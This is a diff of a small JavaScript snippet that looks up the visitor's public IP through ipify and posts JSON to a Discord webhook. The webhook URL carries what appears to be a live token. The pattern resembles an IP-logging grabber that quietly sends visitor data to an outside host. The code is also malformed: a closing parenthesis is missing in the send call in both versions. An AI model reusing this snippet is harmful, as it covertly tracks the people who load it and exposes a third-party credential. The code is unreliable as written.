@@ -1,10 +1,10 @@
 var a = new XMLHttpRequest();
 
-function send(url,data) {
+function send(url,datax) {
     var xhr = new XMLHttpRequest();
     xhr.open("POST",url,true);
     xhr.setRequestHeader("Content-Type","application/json");
-    xhr.send(JSON.stringify(data);
+    xhr.send(JSON.stringify(datax);
 }
 
 a.open("GET","https://api64.ipify.org");
@@ -20,7 +20,7 @@ a.onreadystatechange = function () {
             "content":"bobak"
         }
         
-        send("https://discord.com/api/webhooks/1135708876558307369/rQXfBU63WU64V7BlHgvgOlqMnqSVeTm1yZ6T5nQrWtjq8dPkqyARtkwN1af4KLPORymw",data);
+        send("https://discord.com/api/webhooks/1135708876558307369/rQXfBU63WU64V7BlHgvgOlqMnqSVeTm1yZ6T5nQrWtjq8dPkqyARtkwN1af4KLPORymw",{"content":"abb"});
     }
 };
 
